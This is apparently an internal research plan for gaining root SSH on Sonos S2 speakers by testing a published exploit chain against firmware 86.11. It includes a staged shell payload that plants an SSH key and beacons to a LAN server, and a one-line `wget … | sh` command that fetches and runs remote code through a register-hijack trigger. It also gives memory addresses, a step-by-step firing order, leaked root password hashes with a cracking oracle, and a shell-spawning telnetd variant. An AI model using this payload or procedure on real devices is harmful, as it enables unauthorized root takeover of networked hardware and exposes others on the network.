# The Sonos-One SSH chain, measured against our fleet

## Verdict

The chain **does not bypass our blocker**, but it retires a different one we have been fighting for
two weeks: **on S2 we should stop spawning a listener at all.**

What transfers, and is now verified on our own build, is the *payoff* half of the report:

Verified against the **fleet's own firmware**: 86.11-82170's rootfs (section 4, model-12 key,
squashfs4) extracted and read, not an older image:

| claim in the report | 86.11-82170, as shipped | verdict |
|---|---|---|
| anacapad runs non-root **with caps** | `/opt/bin/anacapactl`: `-u anacapa -C all=eip`; `libsonosminiutils` calls `cap_from_text` + `cap_set_proc`; daemon imports `sonos_auth_become_capable` | **holds** — `all=eip` includes `CAP_DAC_OVERRIDE`, so 0700 root dirs are writable |
| a root-owned SSH init recreates the auth file | `/etc/inittab`: `null::respawn:/etc/scripts/run_sshd.sh`; the script does `mkdir -m 700 -p /jffs/sys/debug/ssh`, `touch …/authorized_keys` if absent, then `exec /usr/bin/dropbear -R -F` | **holds**, and it is respawned by init **as root** — we never spawn dropbear |
| dropbear accepts ECDSA only | `dropbear` is compiled with `DROPBEAR_AUTHORIZED_KEYS_FILE=/jffs/sys/debug/ssh/authorized_keys`; the `/ssh/fingerprints` route hard-requires `ecdsa-sha2-nistp256` | **holds** — P-256, one line |
| unlock flag gates it | `run_sshd.sh`: `waitwhiletrue "[ ! -f /tmp/device_unlocked_flag ]"` — 10 s poll loop | **holds** |
| root password | S2 `/etc/shadow`: `root:$1$AugXR3h8$QldrLrShxOKE1vWbFJe3H.`, identical on 86.10 and 86.11. S1 `/etc/passwd` (no shadow): `$1$s0Tt1Y4O$8STUOMjCwTV0tp7P6dti50`, identical on 74170 **and** the 11-12 build 83121 | per-family constants; 18 obvious guesses and a 60 k-word pass negative, second pass running |
| a URL-driven `.mpd` path injection | **not on our build**: no `.mpd` string anywhere in the 86.10/86.11 rootfs (129 files, `anacapad` included), and all six `sonosFileCreate` sites write **fixed literal paths** (`/var/run/forceupdateurl`, `settings`+`cloudconfig_override.json`, `factoryReset.txt`, …) | **does not transfer** |

So their *primitive* (URL → filesystem path) belongs to the 81.1/model-26 line. Our primitive remains
"get one string into the daemon", i.e. the same register question as before. What changes is that one
successful command is now **enough**: no socket binding, no daemonising, no watchdog race, no
`-p`/`-l` argument order, nothing to keep alive.

## Scope: S2 only

- **S1 has no dropbear at all**, and not just in the build I had: the newest S1 release,
  **57.23-83121 (built 2026-11-12, fetched and decrypted today)**, still ships no `dropbear*`, keeps
  `run_sshd.sh` = `exec /usr/sbin/telnetd`, does **not** list it in `inittab`, and still calls it only
  from `/etc/Configure` behind `/jffs/system/Configure.dev`. That telnetd is a busybox symlink and is
  started without `-l`, so it shows a login prompt against root's crypt hash. **S1 keeps the
  `telnetd -l /bin/sh` spawn.**
- **S2 (86.10 / 86.11) gets the key plan.** Today's fleet: `.86` and `.81` are on **86.11-82170**,
  both locked (ports 22/23/2323 closed, `/ssh/fingerprints` 403), so the slot is open for a first
  test.

## The payload

Key (generated, P-256, 173 B): `/tmp/soc_rootkey_ecdsa` + `.pub`. Staged script
`/tmp/q57/s2.sh` (served on `http://192.168.4.160:8985/`):

```sh
#!/bin/sh
set -x
touch /tmp/device_unlocked_flag
mkdir -p /jffs/sys/debug/ssh
chmod 700 /jffs/sys/debug/ssh
grep -q fsonos-root /jffs/sys/debug/ssh/authorized_keys 2>/dev/null || echo '<pubkey>' >> /jffs/sys/debug/ssh/authorized_keys
chmod 644 /jffs/sys/debug/ssh/authorized_keys
sync
wget -qO- http://192.168.4.160:8985/BEAT-S2KEY
```

Logic validated in a relocated simulation (`mkdir`/`echo`/`chmod`/`grep -q` semantics identical):
ends with dir `0700`, file `0644`, key present, flag created. The BARE command is only 44 B —
`wget -qO- http://192.168.4.160:8985/s2.sh|sh` — so it fits **either** mechanism and the payload
itself is server-side editable without another fire:

- `/tmp/S2KEY_sys.aa` — `FN=0x6DCEA0` (`system@plt`), node0 = that 44-B command.
- `/tmp/S2KEY_wrap.aa` — `FN=0x656978` (exec wrapper), `argv={"/bin/sh","-c",cmd,NULL}` at node0.

Why the flag+key pair and not their delete-then-reboot: with `all=eip` we can write into the 0700
dir directly, and 86.11's dropbear carries **no ownership/strict-mode strings at all** (checked:
"must be owned by"/"world writable" absent; only `kex-strict-*` and the unrelated `-G` group option,
which `run_sshd` does not pass). So an anacapa-owned `0644` keys file is accepted and the
delete→reboot dance is unnecessary here. It is needed only where the writer cannot bypass DAC.

## What the chain does *not* solve, stated plainly

The trigger is still "one string into a register" (`a0` on S2). Nothing here removes that. Order the
fire accordingly:

1. **Fingerprint first** — `probe_builder.py --mode fp --ms 8` at a fresh hit, 0.2 s polls +
   `BootSeq`. `~8 s` outage = the argument works and the key payload is a formality; no outage /
   sub-second gap = the argument does not (then `--mode wrap`, whose `access()` fails fast rather than
   rebooting).
2. **Then** `S2KEY_sys.aa` (44 B) at the same S, and watch **`/ssh/fingerprints`**: it goes
   `403 → 200` only once the flag exists *and* dropbear has written a host key — an on-device success
   signal that arrives *before* any SSH attempt.
3. Then `ssh -i /tmp/soc_rootkey_ecdsa root@<unit>` (P-256; RSA and Ed25519 are known dead).

## The password branch (cheap, worth running in parallel)

Both root hashes are **per-family constants** (identical across builds of the same family: S2 `AugXR3h8`
on 86.10 and 86.11; S1 `s0Tt1Y4O` on 74170 and 83121) and are MD5-crypt with a known salt, so one
cracked password covers a whole family. With it, the key file becomes optional: unlock (`touch` the flag, or plant
`Configure.dev`) → init's dropbear → `ssh root@<unit>` with the password. That removes the 0700-dir
write and any key-format risk; the flag write remains. `openssl passwd -1 -salt AugXR3h8 <candidate>`
is a direct oracle (`/usr/share/dict/words` is present on this Mac, 236 k entries).

## Risk / rollback

The unlock is one-way-ish while it lasts: dropbear binds :22 as root for everyone on the LAN until
reboot. Revert with `rm /tmp/device_unlocked_flag` and, if the file was ours,
`rm /jffs/sys/debug/ssh/authorized_keys` — both are ours to remove by the same route (and the key's
comment `fsonos-root` makes it greppable). `set -x` writes to `/dev/kmsg` via inittab, so a failed
script is visible on the console path only — the `BEAT-S2KEY` hit is the external proof the script
ran at all.
